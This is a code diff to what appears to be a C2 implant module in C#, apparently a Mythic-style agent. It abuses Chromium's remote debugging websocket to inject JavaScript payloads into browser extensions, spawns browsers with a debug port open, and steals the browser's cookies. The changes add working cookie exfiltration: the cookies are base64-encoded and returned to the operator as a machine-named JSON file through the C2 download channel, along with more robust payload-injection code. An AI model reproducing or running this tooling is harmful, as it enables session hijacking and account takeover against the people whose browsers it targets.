@@ -69,7 +69,7 @@ namespace Agent
 
             foreach (var extension in extensions)
             {
-                ExtensionManifest manifest = await GetManifestFromExtension(extension.webSocketDebuggerUrl);
+                ExtensionManifest manifest = await GetManifestFromExtension(extension);
 
                 if (manifest is null)
                 {
@@ -103,16 +103,23 @@ namespace Agent
             {
                 if (string.IsNullOrEmpty(this.config.target))
                 {
-                    ReturnOutput("[!] No target specified, and no paylod set! Please set one of the options.", task_id);
+                    ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
                     return;
                 }
                 payload = this.config.GetDefaultPayload();
             }
 
-            ReturnOutput("Injecting our payload", task_id);
+            ReturnOutput("[+] Injecting our payload", task_id);
             foreach (var extension in extensionCandidates)
             {
-                await this.InjectJs(payload, extension.webSocketDebuggerUrl);
+                if(this.TryInjectJs(extension, payload, out var response))
+                {
+                    ReturnOutput("[+] Succesfully injected payload.", task_id);
+                    ReturnOutput($"Response: {response}", task_id);
+                    return;
+                }
+                ReturnOutput("[!] Failed to innject payload.", task_id);
+                ReturnOutput($"Response: {response}", task_id);
             }
         }
         private async Task<List<ChromeJsonObject>> GetExtensions()
@@ -138,7 +145,6 @@ namespace Agent
                 }
                 catch (HttpRequestException)
                 {
-                    Console.WriteLine("Failed to retrieve extensions information. Make sure Chrome is running.");
                 }
             }
             return extensions;
@@ -155,6 +161,11 @@ namespace Agent
                 }
             }
             return "Failed to identify specified extension.";
+        }
+        private bool TryInjectJs(ChromeJsonObject extension, string jsCode, out string response)
+        {
+            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl)).Result;
+            return true;
         }
         private async Task<string> InjectJs(string jsCode, Uri uri)
         {
@@ -181,14 +192,14 @@ namespace Agent
                 return await WebSocketHelper.ReceiveMessage(webSocket);
             }
         }
-        private async Task<string> GetCookies()
+        private async Task<bool> TryGetCookies(string task_id)
         {
 
-            List<ChromeJsonObject> extensions = await this.GetExtensions();
+            List<ChromeJsonObject> extensions = this.GetExtensions().Result;
 
             if(extensions.Count == 0)
             {
-                return String.Empty;
+                return false;
             }
 
             using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
@@ -217,22 +228,33 @@ namespace Agent
                 if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
                 {
                     //Strip outer edge, leaving only the good inside
-                    return resultElement.GetRawText();
+                    this.cookiesOut.Add(task_id, resultElement.GetRawText());
+                    ReturnOutput("[+] Returning parsed cookies file", task_id);
+                    await StartSendFile(task_id);
+                    return true;
                 }
 
                 //Something fucked up, so just return the raw response
-                return response;
+                ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
+                this.cookiesOut.Add(task_id, resultElement.GetRawText());
+                await StartSendFile(task_id);
+                return false;
             }
         }
-        private async Task<ExtensionManifest> GetManifestFromExtension(string webSocketDebuggerUrl)
+        private async Task<ExtensionManifest> GetManifestFromExtension(ChromeJsonObject extension)
         {
-            string response = await InjectJs("chrome.runtime.getManifest()", webSocketDebuggerUrl);
-            JsonDocument responseJsonDocument = JsonDocument.Parse(response);
-            JsonElement responseRoot = responseJsonDocument.RootElement;
+            //string response = await InjectJs(extension.id,"chrome.runtime.getManifest()");
+            string response = String.Empty;
 
-            if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
+            if(TryInjectJs(extension, "chrome.runtime.getManifest()", out response))
             {
-                return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
+                JsonDocument responseJsonDocument = JsonDocument.Parse(response);
+                JsonElement responseRoot = responseJsonDocument.RootElement;
+
+                if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
+                {
+                    return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
+                }
             }
 
             return new ExtensionManifest();
@@ -254,20 +276,25 @@ namespace Agent
             switch (inputParts[0])
             {
                 case "cursed":
+                    if (inputParts.Length < 2)
+                    {
+                        ReturnOutput("Please specify a browser", message.task_id);
+                        break;
+                    }
                     await this.Cursed(inputParts[1], message.task_id);
-                    //cursed [browser]
                     break;
                 case "cookies":
+                    await this.TryGetCookies(message.task_id);
                     break;
                 case "get":
-                    if (user_input == "get")
+                    if (inputParts.Length < 2)
                         await this.GetValue("", message.task_id);
                     else
                         await this.GetValue(inputParts[1], message.task_id);
                     break;
                 case "set":
                     string value = String.Empty;
-                    if (inputParts.Count() > 3)
+                    if (inputParts.Length > 3)
                         value = string.Join(" ", inputParts, 2, inputParts.Length - 2);
                     else
                         value = inputParts[2].TrimStart('"').TrimEnd('"');
@@ -285,7 +312,19 @@ namespace Agent
                     var res = await this.InjectJs(inputParts[1], inputParts[2]);
                     break;
                 case "spawn":
-                    SpawnElectron(inputParts[1]);
+
+                    if(inputParts.Length < 2)
+                    {
+                        ReturnOutput("Please specify a browser.", message.task_id);
+                        return;
+                    }
+
+                    if (!SpawnElectron(inputParts[1]))
+                    {
+                        ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
+                        return;
+                    }
+                    ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                     break;
                 case "exit":
                     this.config = new Config();
@@ -317,6 +356,8 @@ namespace Agent
                     break;
                 case "edge":
                     break;
+                default:
+                    return false;
             }
             return true;
         }
@@ -341,6 +382,8 @@ namespace Agent
                     break;
                 case "edge":
                     break;
+                default:
+                    return false;
             }
             return true;
         }
@@ -446,29 +489,46 @@ namespace Agent
         }
         public async Task HandleNextMessage(ServerResponseResult response)
         {
+            Console.WriteLine("Starting handlenextmessage");
 
             if (!this.cookiesOut.ContainsKey(response.task_id))
             {
                 return;
             }
-            
+
             DownloadResponse dr = new DownloadResponse()
             {
                 task_id = response.task_id,
-                file_id = response.file_id,
-                
                 download = new DownloadResponseData
                 {
+                    total_chunks = 1,
                     is_screenshot = false,
+                    filename = $"{Environment.MachineName}-cookies.json",
                     host = "",
-                    file_id = response.file_id,
                     chunk_num = 1,
                     chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
-                    full_path = $"{Environment.MachineName}-cookies.json"
-                }
+                    file_id = response.file_id,
+                },
+                //file_id = response.file_id,
             };
 
-            await this.messageManager.AddResponse(dr);
+
+
+            //Console.WriteLine($"Returning {this.cookiesOut[response.task_id].Length} bytes");
+            //DownloadResponse dr = new DownloadResponse()
+            //{
+            //    task_id = response.task_id,
+            //    file_id = response.file_id,
+                
+            //    download = new DownloadResponseData
+            //    {
+            //        chunk_num = 1,
+            //        file_id = response.file_id,
+            //        chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
+            //   }
+            //};
+
+            await this.messageManager.AddResponse(dr.ToJson());
 
             this.cookiesOut.Remove(response.task_id);
         }
@@ -479,18 +539,45 @@ namespace Agent
                 download = new DownloadResponseData()
                 {
                     total_chunks = 1,
-                    full_path = $"{Environment.MachineName}-cookies.json",
+                    //full_path = downloadJob.path,
+                    filename = $"{Environment.MachineName}-cookies.json",
                     chunk_num = 0,
                     chunk_data = string.Empty,
                     is_screenshot = false,
-                    host = "",
                 },
-                user_output = string.Empty,
+                //user_output = string.Empty,
                 task_id = task_id,
-                completed = false,
-                status = string.Empty,
-                file_id = null
+                //completed = false,
+                //status = string.Empty,
+                //file_id = null
             }.ToJson());
+
+
+
+
+            //await messageManager.AddResponse(new DownloadResponse
+            //{
+            //    download = new DownloadResponseData()
+            //    {
+            //        total_chunks = 1,
+            //        filename = $"{Environment.MachineName}-cookies.json",
+            //    },
+            //    task_id = task_id,
+            //    completed = false,
+            //}.ToJson());
         }
+        //private bool CookieBroify(string cookies, string task_id)
+        //{
+        //    JsonDocument responseJsonDocument = JsonDocument.Parse(cookies);
+        //    JsonElement responseRoot = responseJsonDocument.RootElement;
+
+        //    if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
+        //    {
+        //        cookiesOut.Add("task_id", resultElement.GetRawText());
+        //        StartSendFile(task_id);
+        //        return true;
+        //    }
+        //    return false;
+        //}
     }
 }
